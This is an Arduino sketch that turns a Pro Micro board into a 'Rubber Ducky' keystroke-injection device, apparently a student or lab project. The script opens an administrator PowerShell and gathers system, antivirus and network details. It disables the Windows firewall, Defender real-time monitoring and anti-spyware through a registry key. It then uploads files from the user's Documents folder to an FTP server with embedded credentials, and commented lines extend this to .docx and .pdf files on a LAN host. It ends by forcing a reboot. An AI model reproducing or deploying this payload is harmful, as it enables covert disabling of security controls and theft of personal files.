/**
 * PRO MICRO COMO RUBBER DUCKY
 * JOHAN MARIN
 * RENE VEGA
*/
#include "Keyboard.h"
#define powershell "powershell"

String guardar_txt = "| Out-File -Append -FilePath $Guardar_informe\\";
String ip = "ipconfig /all";
String ip_dns = "ipconfig /displaydns";
String dns = "Get-DnsClientCache";
String guardar_informe = "$Guardar_informe = 'C:\\Users\\SrBotana\\Documents'";
String informe_equipo = "Informe_Equipo.txt";
String informe_red = "Informe_Red.txt";

void setup() {
  /**
   * INICIALIZAMOS KEYBOARD
  */
  Keyboard.begin();
  Keyboard.releaseAll();
  delay(3000);
  WIN_R();
  INFORME_SISTEMA();
  SERVIDOR_FTP();
  Keyboard.end();
}

void loop() { 
  /**
   * put your main code here, to run repeatedly:
  */ 
}

/**
 * PULSAMOS WIN + R
*/
void WIN_R() {
  if (Keyboard.press(KEY_LEFT_GUI) + Keyboard.press('r') ) {
    Keyboard.releaseAll();
    delay(150);
    Keyboard.print(powershell);
    delay(150);
    MOD_ADMIN();
  } else {
    delay(1000);
    Keyboard.press(KEY_ESC) + Keyboard.release(KEY_ESC);
    Keyboard.end();
  }
}

/**
 * ENTRAMOS EN MODO ADMINISTRADOR
*/
void MOD_ADMIN() {
  delay(150);
  if (powershell == "powershell") {
    delay(150);
    Keyboard.press(KEY_LEFT_CTRL) + Keyboard.press(KEY_LEFT_SHIFT) + Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000);
    Keyboard.press(KEY_LEFT_ALT) + Keyboard.press('s');
    Keyboard.releaseAll();
    delay(1000);
  } else {
    delay(1000);
    Keyboard.end();
  }
}

/**
 * FUNCION PARA LA EXTRACCION DE INFORMACION
*/
void INFORME_SISTEMA() {
  delay(500);
  Keyboard.println(guardar_informe + "\n");
  Keyboard.println("echo 'INFORME DEL SISTEMA' > $Guardar_informe\\" + informe_equipo + " | Get-WmiObject Win32_ComputerSystem; Get-WmiObject Win32_ComputerSystem" + guardar_txt + informe_equipo);
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.println("echo 'INFORME DEL DISCO' >> $Guardar_informe\\" + informe_equipo + " | Get-WmiObject -Class Win32_DiskDrive; Get-WmiObject -Class Win32_DiskDrive" + guardar_txt + informe_equipo);
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.println("echo 'INFORME ANTIVIRUS' >> $Guardar_informe\\" + informe_equipo + " | Get-WmiObject -Namespace 'ROOT\\SecurityCenter2' -Class AntivirusProduct; Get-WmiObject -Namespace 'ROOT\\SecurityCenter2' -Class AntivirusProduct" + guardar_txt + informe_equipo);
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.println("$IP = " + ip + "\n");
  Keyboard.println("$IP_DNS = " + ip_dns + "\n");
  Keyboard.println("$DNS = " + dns + "\n");
  Keyboard.println("echo 'INFORME IP Y DNS' >> $Guardar_informe\\" + informe_red + "\n");
  Keyboard.println(ip + "\n" + ip_dns + "\n" + dns + "\n" + "echo '------INFORME IP COMPLETA------'$IP, '------INFORME DNS IP------'$IP_DNS,'------INFORME CACHE DNS------'$DNS" + guardar_txt + informe_red);
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  FIREWALL();
}

/**
 * FUNCION PARA DESACTIVAR FIREWALL
*/
void FIREWALL() {
  delay(500);
  Keyboard.println("#DESACTIVAR FIREWALL\n");
  Keyboard.println("Set-NetFirewallProfile Domain,Public,Private -Enabled False");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.println("#DESACTIVAR WIN-DEFENDER\n");
  Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.println("#DESACTIVAR SEGURIDAD\n");
  Keyboard.println("New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
}

/**
 * FUNCION PARA LA CREACION DEL SERVIDOR FTP
 * 
 * DESCOMENTANDO LAS OTRAS LINEAS PARA PASAR ARCHIVO COMO PDF Y DOCX
*/
void SERVIDOR_FTP() {
  delay(500);
  Keyboard.print("$ruta='C:\\Users\\SrBotana\\Documents'; $servidor_ftp = 'ftp://usuario:contraseña@127.0.0.1/'\n $webclient = New-Object System.Net.WebClient\n foreach($dato in (dir $ruta '*.txt')){'Subiendo archivo: $dato...'\n $uri = New-Object System.Uri($servidor_ftp + $dato.Name)\n $webclient.UploadFile($uri, $dato.FullName)}");
  /*Keyboard.print("$ruta='C:\\Users\\SrBotana\\Documents'; $servidor_ftp = 'ftp://Aliens:12524799@192.168.10.110/'; $webclient = New-Object System.Net.WebClient; foreach($dato in (dir $ruta '*.docx')){'Subiendo archivo: $dato...'; $uri = New-Object System.Uri($servidor_ftp + $dato.Name); $webclient.UploadFile($uri, $dato.FullName)}\n");
    Keyboard.print("$ruta='C:\\Users\\SrBotana\\Documents'; $servidor_ftp = 'ftp://Aliens:12524799@192.168.10.110/'; $webclient = New-Object System.Net.WebClient; foreach($dato in (dir $ruta '*.pdf')){'Subiendo archivo: $dato...'; $uri = New-Object System.Uri($servidor_ftp + $dato.Name); $webclient.UploadFile($uri, $dato.FullName)}\n");*/
  delay(100);
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.press(KEY_LEFT_ALT) + Keyboard.press(KEY_F7);
  Keyboard.release(KEY_LEFT_ALT) + Keyboard.release(KEY_F7);
  Keyboard.println("Restart-Computer -Force -Confirm \n");/*------pedimos la confirmacion para reiniciar windows para que haga cambios en el equipo------*/
}
